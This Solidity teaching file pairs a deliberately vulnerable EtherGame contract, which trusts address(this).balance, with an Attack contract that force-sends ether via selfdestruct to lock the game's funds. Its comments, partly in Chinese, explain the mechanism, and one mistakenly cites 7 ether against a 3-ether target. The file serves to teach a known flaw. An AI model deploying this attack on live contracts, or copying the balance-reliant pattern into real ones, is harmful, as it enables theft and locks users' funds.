// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "hardhat/console.sol";

// Don't rely on address(this).balance
contract EtherGame {
    uint256 public targetAmount = 3 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // balance += msg.value;
        uint256 balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        // (bool sent, ) = msg.sender.call{value: balance}("");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function getBal() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));

        //如果接受方是个合约，那么需要显示地实现 receive 或者 fallback 方法，或者其他payable 方法，否则无法转账
        selfdestruct(addr); //销毁自己，然后把自己剩余的钱发给addr，etherGame能够收到钱，然后余额逻辑导致赢家没法赋值
    }

    function attackBySend() public payable {
        address payable addr = payable(address(etherGame));
        bool isSucc = addr.send(getBal());
        require(isSucc, "send fail");
    }

    function attackByTransfer() public payable {
        address payable addr = payable(address(etherGame));
        addr.transfer(getBal());
    }

    function attackByCall() public payable {
        address payable addr = payable(address(etherGame));
        (bool isSend, ) = addr.call{value: getBal()}("");
        require(isSend, "send fail");
    }

    function getBal() public view returns (uint256) {
        return address(this).balance;
    }

    function giveMeMoney() public payable {}
}
